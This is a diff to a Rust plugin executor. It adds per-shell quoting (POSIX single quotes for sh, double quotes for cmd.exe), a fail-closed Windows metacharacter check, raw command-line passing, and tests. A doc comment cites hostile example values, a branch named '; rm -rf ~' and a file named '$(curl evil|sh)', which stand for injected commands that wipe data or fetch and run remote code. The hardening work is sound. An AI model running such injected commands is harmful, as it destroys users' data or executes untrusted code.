@@ -24,8 +24,10 @@
 //! which a malicious project can craft freely (a branch literally named
 //! `; rm -rf ~`, a file named `$(curl evil|sh)`, diff text full of backticks).
 //!
-//! Every substituted value is therefore passed through [`shell_quote`], which
-//! POSIX-single-quotes it so the shell treats it as one inert literal argument
+//! Every substituted value is therefore quoted for the shell that will read it
+//! — [`shell_quote`] (POSIX single-quoting) for `sh`, [`cmd_quote`] for
+//! `cmd.exe` behind the Windows gate described below — so the shell treats it
+//! as one inert literal argument
 //! — it can never break out of its argument, start a new command, or trigger
 //! expansion. [`expand_placeholders`] is also a strict SINGLE-PASS scanner: a
 //! value that itself contains the text `{repo}` (e.g. inside a diff) is NEVER
@@ -34,36 +36,31 @@
 //! below (including one that actually runs the expansion through `sh -c` and
 //! asserts the value round-trips as literal data with no side effect).
 //!
-//! ## Platform shell + the Windows quoting caveat (READ THIS)
+//! ## Platform shell + Windows quoting (READ THIS)
 //!
 //! On unix the executor runs `sh -c <expanded>`, and [`shell_quote`] produces
 //! POSIX single-quoting, which is a total, well-defined neutralization: inside
 //! `'...'` every byte except `'` is literal, and `'` is emitted as the classic
 //! `'\''` (close-quote, escaped-quote, reopen-quote) sequence.
 //!
-//! On WINDOWS the executor runs `cmd /C <expanded>` — but [`shell_quote`] still
-//! emits POSIX single-quoting, which `cmd.exe` does NOT interpret the same way
-//! (`cmd` does not treat `'` as a quote at all; it uses `"` and `^`, and its
-//! metacharacters — `&`, `|`, `%`, `^`, `<`, `>` — follow entirely different
-//! rules). So the single-quoted form is NOT a robust neutralization under
-//! `cmd.exe`, and this executor does not attempt a bulletproof `cmd` quoter
-//! (there isn't a simple correct one). Mitigations / rationale:
-//!   * Most plugin `run` templates people write are POSIX-shell one-liners
-//!     that pipe git output to a tool; on Windows those already assume a
-//!     POSIX-ish shell (Git-Bash/WSL) on PATH, not raw `cmd`.
-//!   * The value is still wrapped, so ordinary spaces/paths behave; the risk
-//!     is specifically an attacker-controlled value containing `cmd`
-//!     metacharacters.
-//! Because that single-quoting is NOT a robust `cmd.exe` neutralization,
-//! [`run_template`] FAILS CLOSED on Windows: before running, it rejects the
-//! command if any substituted value contains a `cmd` metacharacter
-//! ([`windows_cmd_unsafe`] — `& | < > ^ % ! "`, CR/LF) that could break out.
-//! So a hostile branch/ref/file name cannot inject on Windows, at the cost of
-//! refusing some legitimate values (and any `{diff}`, which routinely contains
-//! such characters) until the proper fix lands. Unix is unaffected: `sh -c`
-//! honors the single-quoting fully. The proper Windows fix (route through a
-//! bundled POSIX shell, or a `cmd`/PowerShell-correct quoter) is deferred — see
-//! "Deferred hardening" below.
+//! On WINDOWS the executor runs `cmd.exe /S /C "<expanded>"`, and the values
+//! are quoted for `cmd` instead ([`cmd_quote`], selected by [`Shell::Cmd`]):
+//! wrapped in `"..."`, with a trailing run of backslashes doubled so a path
+//! like `C:\dir\` can't escape its own closing quote under the
+//! `CommandLineToArgvW` rules most programs parse their arguments with.
+//!
+//! Double-quoting is only a complete neutralization for `cmd` because of a
+//! precondition the executor enforces first: [`run_template`] FAILS CLOSED on
+//! Windows, rejecting the command if any substituted value contains a `cmd`
+//! metacharacter ([`windows_cmd_unsafe`] — `& | < > ^ % ! "`, CR/LF). Every
+//! value that reaches `cmd` therefore has no `"` to end its quotes early and no
+//! `%`/`!` for `cmd` to expand even inside them; what is left — spaces, `(`,
+//! `)`, `;`, `,`, `=`, `'` — is literal inside `"..."`. The cost is that some
+//! legitimate values are still refused on Windows, `{diff}` (which routinely
+//! contains those characters) most of all. Unix is unaffected.
+//!
+//! How the `cmd` line is built matters as much as the quoting — see
+//! [`run_template_with_timeout`] for why it is a raw `/S /C "..."` argument.
 //!
 //! ## Security model (PER-48) + remaining deferred hardening
 //!
@@ -198,9 +195,8 @@ pub const HOOK_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30)
 /// is emitted as the classic `'\''` — close-quote, a backslash-escaped literal
 /// quote, reopen-quote. An empty string becomes `''` (a real empty argument).
 ///
-/// See the module doc's "Windows quoting caveat": this is POSIX-correct, and
-/// the executor's unix path uses `sh -c`; the Windows `cmd /C` path does NOT
-/// interpret single-quoting the same way, a documented known limitation.
+/// This is the [`Shell::Posix`] quoter, used for the unix `sh -c` path; the
+/// Windows `cmd` path uses [`cmd_quote`] instead (see the module doc).
 pub fn shell_quote(s: &str) -> String {
     let mut out = String::with_capacity(s.len() + 2);
     out.push('\'');
@@ -215,31 +211,75 @@ pub fn shell_quote(s: &str) -> String {
     out
 }
 
-/// Quote an `Option` value: `Some(v)` -> [`shell_quote`]`(v)` (note `Some("")`
-/// -> `''`, a real empty arg), `None` -> empty string (nothing inserted).
-fn quote_opt(v: &Option<String>) -> String {
+/// Double-quote `s` for `cmd.exe`: `"` + `s` + `"`, with any run of TRAILING
+/// backslashes doubled. A program parsing its command line with the
+/// `CommandLineToArgvW`/MSVCRT rules reads `\"` as a literal quote, so an
+/// undoubled `C:\dir\` would swallow its own closing quote; doubled (`\\"`) it
+/// reads as one backslash and then the end of the argument. Backslashes
+/// anywhere else are literal under those rules and are left alone. An empty
+/// string becomes `""` (a real empty argument).
+///
+/// PRECONDITION: `s` has already passed [`windows_cmd_unsafe`] — the Windows
+/// executor refuses the whole command otherwise — so it contains no `"` to end
+/// the quotes early and no `%`, `!`, `^`, `&`, `|`, `<`, `>` or newline for
+/// `cmd` to act on. Inside `"..."` everything that remains is literal. Not a
+/// general-purpose `cmd` quoter: it is only correct behind that gate.
+pub fn cmd_quote(s: &str) -> String {
+    debug_assert!(!windows_cmd_unsafe(s), "cmd_quote called on a value windows_cmd_unsafe rejects: {s:?}");
+    let trailing = s.len() - s.trim_end_matches('\\').len();
+    let mut out = String::with_capacity(s.len() + trailing + 2);
+    out.push('"');
+    out.push_str(s);
+    out.push_str(&"\\".repeat(trailing));
+    out.push('"');
+    out
+}
+
+/// Which shell a template is being expanded for — picks the quoter every
+/// substituted value goes through.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum Shell {
+    /// `sh -c` — POSIX single-quoting ([`shell_quote`]).
+    Posix,
+    /// `cmd.exe /S /C` — double-quoting ([`cmd_quote`]). Only sound behind the
+    /// [`windows_cmd_unsafe`] gate in [`run_template_with_timeout`].
+    Cmd,
+}
+
+impl Shell {
+    fn quote(self, s: &str) -> String {
+        match self {
+            Shell::Posix => shell_quote(s),
+            Shell::Cmd => cmd_quote(s),
+        }
+    }
+}
+
+/// Quote an `Option` value: `Some(v)` -> the shell's quoting of `v` (note
+/// `Some("")` -> a real empty arg), `None` -> empty string (nothing inserted).
+fn quote_opt(v: &Option<String>, shell: Shell) -> String {
     match v {
-        Some(s) => shell_quote(s),
+        Some(s) => shell.quote(s),
         None => String::new(),
     }
 }
 
-/// `{files}`: each path shell-quoted, space-joined. Empty list -> empty string.
-fn quote_files(files: &[String]) -> String {
-    files.iter().map(|f| shell_quote(f)).collect::<Vec<_>>().join(" ")
+/// `{files}`: each path quoted on its own, space-joined. Empty list -> empty string.
+fn quote_files(files: &[String], shell: Shell) -> String {
+    files.iter().map(|f| shell.quote(f)).collect::<Vec<_>>().join(" ")
 }
 
 /// Map a recognized token name to its shell-quoted value; an UNRECOGNIZED name
 /// -> empty string (documented "unknown token expands to empty").
-fn substitute(name: &str, ctx: &PlaceholderCtx) -> String {
+fn substitute(name: &str, ctx: &PlaceholderCtx, shell: Shell) -> String {
     match name {
-        "sha" => quote_opt(&ctx.sha),
-        "file" => quote_opt(&ctx.file),
-        "files" => quote_files(&ctx.files),
-        "diff" => quote_opt(&ctx.diff),
-        "repo" => quote_opt(&ctx.repo),
-        "branch" => quote_opt(&ctx.branch),
-        "ref" => quote_opt(&ctx.gitref),
+        "sha" => quote_opt(&ctx.sha, shell),
+        "file" => quote_opt(&ctx.file, shell),
+        "files" => quote_files(&ctx.files, shell),
+        "diff" => quote_opt(&ctx.diff, shell),
+        "repo" => quote_opt(&ctx.repo, shell),
+        "branch" => quote_opt(&ctx.branch, shell),
+        "ref" => quote_opt(&ctx.gitref, shell),
         _ => String::new(),
     }
 }
@@ -282,8 +322,17 @@ fn parse_token(rest: &str) -> Option<(&str, usize)> {
 /// through verbatim.
 ///
 /// This function is PURE (no I/O) and is the security-critical core; see the
-/// exhaustive adversarial tests at the bottom of the module.
+/// exhaustive adversarial tests at the bottom of the module. It quotes for
+/// [`Shell::Posix`]; [`expand_placeholders_for`] picks the shell.
 pub fn expand_placeholders(template: &str, ctx: &PlaceholderCtx) -> String {
+    expand_placeholders_for(template, ctx, Shell::Posix)
+}
+
+/// [`expand_placeholders`] with each value quoted for `shell`. The scanner,
+/// the token grammar and the single-pass guarantee are identical; only the
+/// quoter differs. [`run_template_with_timeout`] uses [`Shell::Cmd`] on
+/// Windows.
+pub fn expand_placeholders_for(template: &str, ctx: &PlaceholderCtx, shell: Shell) -> String {
     let mut out = String::with_capacity(template.len());
     let mut i = 0usize;
     while i < template.len() {
@@ -292,7 +341,7 @@ pub fn expand_placeholders(template: &str, ctx: &PlaceholderCtx) -> String {
         // inside a multibyte sequence) — safe to test the first byte here.
         if rest.as_bytes()[0] == b'{' {
             if let Some((name, consumed)) = parse_token(rest) {
-                out.push_str(&substitute(name, ctx));
+                out.push_str(&substitute(name, ctx, shell));
                 i += consumed;
                 continue;
             }
@@ -305,15 +354,17 @@ pub fn expand_placeholders(template: &str, ctx: &PlaceholderCtx) -> String {
     out
 }
 
-/// `cmd.exe` metacharacters that POSIX single-quoting does NOT neutralize
-/// (`cmd` ignores `'`). Used ONLY on the Windows executor path to fail closed.
+/// `cmd.exe` characters that double-quoting ([`cmd_quote`]) does NOT
+/// neutralize: `"` ends the quotes, `%`/`!` expand even inside them, and the
+/// rest are refused too so a value never depends on quote state being exact.
+/// Used ONLY on the Windows executor path to fail closed.
 const WINDOWS_CMD_META: &[char] = &['&', '|', '<', '>', '^', '%', '!', '"', '\r', '\n'];
 
-/// True if `s` contains a character `cmd.exe` treats as a metacharacter
-/// regardless of our single-quoting — i.e. a value that could break out of its
-/// argument under `cmd /C`. Pure + tested on every platform; its *use* in
-/// [`run_template`] is `cfg!(windows)`-gated (see the module doc's Windows
-/// caveat), but the logic is exercised by unit tests everywhere.
+/// True if `s` contains a character `cmd.exe` could act on despite
+/// [`cmd_quote`] — i.e. a value that could break out of its argument under
+/// `cmd`. Pure + tested on every platform; its *use* in [`run_template`] is
+/// `cfg(windows)`-gated (see the module doc's "Platform shell + Windows
+/// quoting"), but the logic is exercised by unit tests everywhere.
 pub fn windows_cmd_unsafe(s: &str) -> bool {
     s.chars().any(|c| WINDOWS_CMD_META.contains(&c))
 }
@@ -395,9 +446,10 @@ pub fn run_template(template: &str, cwd: &str, ctx: &PlaceholderCtx) -> Result<C
 /// returned as-is (a non-zero exit is a normal, reportable outcome, NOT an
 /// `Err` — an `Err` here means the command could not be launched or timed out).
 ///
-/// Routed through `sh -c` (unix) / `cmd /C` (Windows) so a plugin `run` string
-/// can be a full command line with args/pipes, exactly like a difftool `cmd`.
-/// See the module doc for the Windows single-quoting caveat.
+/// Routed through `sh -c` (unix) / `cmd.exe /S /C "..."` (Windows) so a plugin
+/// `run` string can be a full command line with args/pipes, exactly like a
+/// difftool `cmd`. Values are quoted for the shell that will read them — see
+/// the module doc's "Platform shell + Windows quoting".
 pub fn run_template_with_timeout(
     template: &str,
     cwd: &str,
@@ -405,22 +457,31 @@ pub fn run_template_with_timeout(
     timeout: std::time::Duration,
 ) -> Result<CommandOutput, String> {
     use std::process::Command;
-    // Windows fail-closed guard (see the module doc's Windows caveat): our POSIX
-    // single-quoting does not bind cmd.exe, so refuse rather than risk injection
-    // from an untrusted value. Unix (`sh -c`) is fully protected by the quoting
-    // and skips this entirely.
+    // Windows fail-closed guard (see the module doc): `cmd_quote` only
+    // neutralizes a value with no cmd metacharacter in it, so a value that has
+    // one refuses the whole command. Unix (`sh -c`) is fully protected by the
+    // POSIX quoting and skips this entirely.
     #[cfg(windows)]
-    {
+    let mut command = {
         if let Some((tok, _)) = ctx_values(ctx).into_iter().find(|(_, v)| windows_cmd_unsafe(v)) {
             return Err(ierrp("err_plugins.windows_cmd_unsafe_value", &[("tok", tok)]));
         }
-    }
-    let script = expand_placeholders(template, ctx);
-    let mut command = if cfg!(windows) {
+        let script = expand_placeholders_for(template, ctx, Shell::Cmd);
+        // The cmd line is passed RAW, as exactly `/S /C "<script>"`. Through
+        // `.arg(script)` std would apply MSVCRT argv quoting to it — wrap it
+        // and backslash-escape every `"` — and cmd.exe does not read `\"` as
+        // an escape, so any template with quotes of its own (`findstr /C:"a b"`,
+        // or the values `cmd_quote` produces) arrived mangled. With `/S`, cmd
+        // strips exactly the first and last `"` after /C and runs everything
+        // between verbatim, whatever quotes the script itself contains.
+        use std::os::windows::process::CommandExt;
         let mut c = Command::new("cmd");
-        c.arg("/C").arg(&script);
+        c.raw_arg(format!("/S /C \"{script}\""));
         c
-    } else {
+    };
+    #[cfg(not(windows))]
+    let mut command = {
+        let script = expand_placeholders_for(template, ctx, Shell::Posix);
         let mut c = Command::new("sh");
         c.arg("-c").arg(&script);
         c
@@ -1238,5 +1299,102 @@ mod tests {
         };
         assert_eq!(expand_placeholders("lint -- {files}", &ctx), "lint -- 'a.txt' 'dir with space/b c.txt'");
         assert_eq!(expand_placeholders("lint -- {files}", &PlaceholderCtx::default()), "lint -- ");
+    }
+
+    // ---- cmd quoting (pure, every platform) -----------------------------------
+
+    #[test]
+    fn cmd_quote_cases() {
+        assert_eq!(cmd_quote("plain"), r#""plain""#);
+        assert_eq!(cmd_quote("a b.txt"), r#""a b.txt""#);
+        assert_eq!(cmd_quote(""), r#""""#); // a real empty argument
+        // Embedded backslashes are literal under the argv rules — untouched.
+        assert_eq!(cmd_quote(r"C:\dir\file.txt"), r#""C:\dir\file.txt""#);
+        // A trailing run is doubled so it can't escape the closing quote.
+        assert_eq!(cmd_quote(r"C:\dir\"), r#""C:\dir\\""#);
+        assert_eq!(cmd_quote(r"C:\dir\\\"), r#""C:\dir\\\\\\""#);
+        // Characters cmd treats specially OUTSIDE quotes are literal inside them.
+        assert_eq!(cmd_quote("it's (x);y,z=1"), r#""it's (x);y,z=1""#);
+    }
+
+    #[test]
+    fn expand_for_cmd_quotes_every_token_with_double_quotes() {
+        let ctx = PlaceholderCtx {
+            file: Some("dir with space/x.ts".into()),
+            files: vec!["a b.txt".into(), "c.txt".into()],
+            ..Default::default()
+        };
+        assert_eq!(expand_placeholders_for("lint {file}", &ctx, Shell::Cmd), r#"lint "dir with space/x.ts""#);
+        assert_eq!(expand_placeholders_for("type {files}", &ctx, Shell::Cmd), r#"type "a b.txt" "c.txt""#);
+        assert_eq!(expand_placeholders_for("type {files}", &PlaceholderCtx::default(), Shell::Cmd), "type ");
+        // The POSIX default is unchanged by the shell parameter's existence.
+        assert_eq!(expand_placeholders("type {files}", &ctx), expand_placeholders_for("type {files}", &ctx, Shell::Posix));
+    }
+
+    // ---- the real cmd.exe executor (Windows only) -----------------------------
+    //
+    // These run actual templates through `run_template` — `cmd.exe /S /C` via
+    // `raw_arg` — and check what came out, so the quoting is proven against
+    // the real shell rather than a string comparison.
+
+    #[cfg(windows)]
+    #[test]
+    fn windows_files_with_a_space_reach_cmd_as_separate_arguments() {
+        let dir = tmp_cwd("win-files");
+        std::fs::write(dir.join("a b.txt"), "alpha-content\r\n").unwrap();
+        std::fs::write(dir.join("c.txt"), "gamma-content\r\n").unwrap();
+        let ctx = PlaceholderCtx {
+            repo: Some(dir.to_string_lossy().into_owned()),
+            files: vec!["a b.txt".into(), "c.txt".into()],
+            ..Default::default()
+        };
+        let out = run_template("type {files}", dir.to_str().unwrap(), &ctx).expect("cmd should launch");
+        assert!(out.success, "type should succeed: {out:?}");
+        assert!(out.stdout.contains("alpha-content"), "missing the spaced file: {out:?}");
+        assert!(out.stdout.contains("gamma-content"), "missing the second file: {out:?}");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[cfg(windows)]
+    #[test]
+    fn windows_template_quotes_survive_to_cmd() {
+        let dir = tmp_cwd("win-quotes");
+        let cwd = dir.to_str().unwrap();
+        // A template's own quotes: std's argv quoting used to turn these into
+        // `\"`, which cmd does not understand.
+        let out = run_template(r#"echo "hello world""#, cwd, &PlaceholderCtx::default()).unwrap();
+        assert_eq!(out.stdout.trim(), r#""hello world""#, "{out:?}");
+
+        // Template quotes AND a quoted value in one line.
+        std::fs::write(dir.join("notes file.txt"), "x y z\r\nother line\r\n").unwrap();
+        let ctx = PlaceholderCtx { file: Some("notes file.txt".into()), ..Default::default() };
+        let out = run_template(r#"findstr /C:"x y" {file}"#, cwd, &ctx).unwrap();
+        assert!(out.success, "findstr should match: {out:?}");
+        assert!(out.stdout.contains("x y z"), "{out:?}");
+        assert!(!out.stdout.contains("other line"), "{out:?}");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[cfg(windows)]
+    #[test]
+    fn windows_trailing_backslash_value_does_not_swallow_the_rest_of_the_line() {
+        let dir = tmp_cwd("win-backslash");
+        std::fs::create_dir_all(dir.join("sub dir")).unwrap();
+        let ctx = PlaceholderCtx { file: Some(r"sub dir\".into()), ..Default::default() };
+        let out = run_template("if exist {file} echo found", dir.to_str().unwrap(), &ctx).unwrap();
+        assert_eq!(out.stdout.trim(), "found", "{out:?}");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[cfg(windows)]
+    #[test]
+    fn windows_value_with_a_cmd_metacharacter_is_still_refused() {
+        let dir = tmp_cwd("win-meta");
+        for bad in ["a&b.txt", "x|y", "50%", "say \"hi\"", "a^b"] {
+            let ctx = PlaceholderCtx { files: vec!["ok.txt".into(), bad.into()], ..Default::default() };
+            let err = run_template("type {files}", dir.to_str().unwrap(), &ctx).unwrap_err();
+            assert!(err.contains("err_plugins.windows_cmd_unsafe_value"), "{bad:?} -> {err}");
+        }
+        let _ = std::fs::remove_dir_all(&dir);
     }
 }
